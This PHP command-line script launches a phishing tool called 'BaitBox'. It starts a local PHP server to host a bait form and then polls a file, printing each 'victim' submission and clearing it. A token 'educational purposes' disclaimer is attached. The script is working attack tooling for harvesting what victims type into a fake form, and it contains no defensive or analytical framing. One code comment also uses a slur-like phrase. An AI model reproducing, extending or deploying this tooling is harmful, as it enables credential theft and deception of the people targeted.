<?php
//initializ script
system(PHP_OS_FAMILY == "Windows" ? "cls" : "clear");

// Check if the script is running from CLI
if (php_sapi_name() !== "cli") {
  die("\033[31mTool Must Be Run From Command Line\n\033[0m");
}

// Print "BaitBox" in reddish (simulating using `-F gay` in `toilet`)
echo "\033[31m";
system('toilet -f standard "BaitBOX"');
echo "\033[0m";
echo "\033[31mNote : For Educational Purposses Only\n\033[0m";
// Start PHP's built-in server to host the form locally
$host = "localhost";
$port = "8000";

// Capture the start time in milliseconds
$start_time = microtime(true);

// Start the server in the background
$server = shell_exec("php -S $host:$port > /dev/null 2>&1 & echo $!");

// Capture the end time in milliseconds
$end_time = microtime(true);

// Calculate the time taken in milliseconds
$time_taken = ($end_time - $start_time) * 1000;

// Check if the server started
if ($server) {
  echo "Starting server on http://$host:$port\n";
  echo "\033[32mServer started successfully in " .
    round($time_taken, 2) .
    " milliseconds.\n\033[0m";
} else {
  echo "\033[31mError: Server not started.\n\033[0m";
}

// The location of your form (form.php)
$form_file = "index.php";

// Check if form file exists
if (!file_exists($form_file)) {
  die("Error: The index.php file is missing. Please create the form file.\n");
}

// Start listening for changes in the input file
$file = "input.txt";

echo "\e[33mwaiting For Victim...\n\e[0m";
echo "\e[34mClick Control C to Stop\e[0m" . "\n";
while (true) {
  clearstatcache();
  if (file_exists($file)) {
    $input = file_get_contents($file);

    if (!empty($input)) {
      echo "-------------------------------------\n";
      echo "Input received: $input\n";

      // Clear the file after reading
      file_put_contents($file, "");
    }
  }

  // Pause for 2 seconds before checking again
  sleep(2);
}
